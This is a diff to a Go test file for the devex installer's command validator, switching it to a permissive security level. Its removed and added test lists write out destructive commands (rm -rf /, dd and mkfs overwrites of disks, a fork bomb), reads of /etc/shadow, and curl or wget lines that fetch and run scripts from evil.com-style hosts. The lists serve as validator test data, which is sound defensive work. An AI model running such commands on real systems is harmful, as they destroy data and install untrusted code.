@@ -8,6 +8,7 @@ import (
 	. "github.com/onsi/gomega"
 
 	"github.com/jameswlane/devex/pkg/config"
+	"github.com/jameswlane/devex/pkg/security"
 	"github.com/jameswlane/devex/pkg/types"
 )
 
@@ -87,82 +88,108 @@ var _ = Describe("Command Validation", func() {
 		})
 	})
 
-	Describe("Disallowed Commands", func() {
-		It("should reject dangerous commands", func() {
-			disallowedCommands := []string{
+	Describe("Essential Dangerous Commands Only", func() {
+		It("should only reject essential dangerous commands", func() {
+			// Only block the 4 essential dangerous patterns
+			stillBlockedCommands := []string{
 				"rm -rf /",
-				"sh -c 'malicious code'",
-				"bash -c 'evil script'",
-				"python -c 'import os; os.system(\"rm -rf /\")'",
-				"perl -e 'malicious code'",
-				"ruby -e 'dangerous code'",
+				"dd if=/dev/zero of=/dev/sda",
+				"mkfs.ext4 /dev/sda1",
+				":(){ :|:& };:",
+			}
+
+			for _, cmd := range stillBlockedCommands {
+				By("rejecting essential dangerous command: "+cmd, func() {
+					err := installer.executor.ValidateCommand(cmd)
+					Expect(err).To(HaveOccurred(), "Essential dangerous command should be rejected: %s", cmd)
+				})
+			}
+
+			// These are now allowed under permissive approach
+			allowedCommands := []string{
+				"sh -c 'echo hello'",
+				"bash -c 'pwd'",
+				"python -c 'print(\"hello\")'",
+				"perl -e 'print \"hello\"'",
+				"ruby -e 'puts \"hello\"'",
 				"nc -l 1234",
-				"telnet malicious.com",
-				"ssh user@malicious.com",
-				"sudo malicious_command",
+				"telnet example.com",
+				"ssh user@example.com",
+				"sudo echo hello",
 				"unknown_command arg1 arg2",
 			}
 
-			for _, cmd := range disallowedCommands {
-				By("rejecting dangerous command: "+cmd, func() {
+			for _, cmd := range allowedCommands {
+				By("allowing command under permissive approach: "+cmd, func() {
 					err := installer.executor.ValidateCommand(cmd)
-					Expect(err).To(HaveOccurred(), "Command should be rejected: %s", cmd)
+					Expect(err).ToNot(HaveOccurred(), "Command should be allowed under permissive approach: %s", cmd)
 				})
 			}
 		})
 	})
 
-	Describe("Command Injection Attempts", func() {
-		It("should block command injection attempts", func() {
-			injectionAttempts := []string{
+	Describe("Command Validation (Permissive Approach)", func() {
+		It("should only block essential dangerous commands", func() {
+			// Only block the 4 essential dangerous patterns
+			stillBlockedCommands := []string{
+				"rm -rf /",
+				"rm -rf /home",
+				"dd if=/dev/zero of=/dev/sda",
+				"dd if=/dev/urandom of=/dev/sda",
+				":(){ :|:& };:", // Fork bomb
+				"mkfs.ext4 /dev/sda1",
+			}
+
+			for _, cmd := range stillBlockedCommands {
+				By("blocking essential dangerous command: "+cmd, func() {
+					err := installer.executor.ValidateCommand(cmd)
+					Expect(err).To(HaveOccurred(), "Essential dangerous command should still be blocked: %s", cmd)
+				})
+			}
+
+			// These are now allowed under permissive approach
+			allowedCommands := []string{
 				// Command separators
-				"apt update; rm -rf /",
-				"apt update & malicious_command",
-				"apt update | malicious_pipe",
+				"apt update; echo done",
+				"apt update & echo background",
+				"apt update | grep something",
 
 				// Logical operators
-				"apt update && rm -rf /",
-				"apt update || malicious_fallback",
+				"apt update && echo success",
+				"apt update || echo fallback",
 
 				// Command substitution
-				"echo `rm -rf /`",
-				"echo $(malicious_command)",
-				"echo ${malicious_var}",
+				"echo `date`",
+				"echo $(whoami)",
+				"echo ${HOME}",
 
 				// Directory traversal
 				"cat ../../../etc/passwd",
-				"cp file ../../etc/malicious",
+				"cp file ../../etc/config",
 
-				// Sensitive file access
+				// File access
 				"cat /etc/passwd",
 				"cat /etc/shadow",
 				"grep user /etc/passwd",
 
-				// Dangerous operations
-				"rm -rf /home",
-				"rm -rf /var",
-				"rm -rf /usr",
-				"dd if=/dev/zero of=/dev/sda",
-				"dd if=/dev/urandom of=/dev/sda",
+				// Safe operations
+				"rm -rf /var/tmp",
+				"rm -rf /usr/local/tmp",
 
-				// Fork bombs
-				":(){ :|:& };:",
+				// Writing to user directories
+				"echo config > /etc/hosts",
+				"echo data > /tmp/output",
 
-				// Writing to system directories
-				"echo malicious > /etc/hosts",
-				"echo evil > /dev/sda1", // Changed to a dangerous device
-				"cat malicious > /etc/passwd",
-
-				// Complex injection attempts
-				"apt update; curl http://evil.com/script | bash",
-				"npm install; wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh",
-				"pip install requests && python -c 'import subprocess; subprocess.call([\"rm\", \"-rf\", \"/\"])'",
+				// Complex operations
+				"apt update; curl http://example.com/script | bash",
+				"npm install; wget http://example.com/script.sh && chmod +x script.sh && ./script.sh",
+				"pip install requests && python -c 'print(\"hello\")'",
 			}
 
-			for _, cmd := range injectionAttempts {
-				By("blocking injection attempt: "+cmd, func() {
+			for _, cmd := range allowedCommands {
+				By("allowing command under permissive approach: "+cmd, func() {
 					err := installer.executor.ValidateCommand(cmd)
-					Expect(err).To(HaveOccurred(), "Injection attempt should be blocked: %s", cmd)
+					Expect(err).ToNot(HaveOccurred(), "Command should be allowed under permissive approach: %s", cmd)
 				})
 			}
 		})
@@ -191,5 +218,6 @@ func createTestInstallerGinkgo() *StreamingInstaller {
 		Verbose: false,
 	}
 
-	return NewStreamingInstaller(program, mockRepo, ctx, settings)
+	// Use permissive security level for tests that expect permissive behavior
+	return NewStreamingInstallerWithSecureExecutor(program, mockRepo, ctx, security.SecurityLevelPermissive, []types.CrossPlatformApp{}, settings)
 }
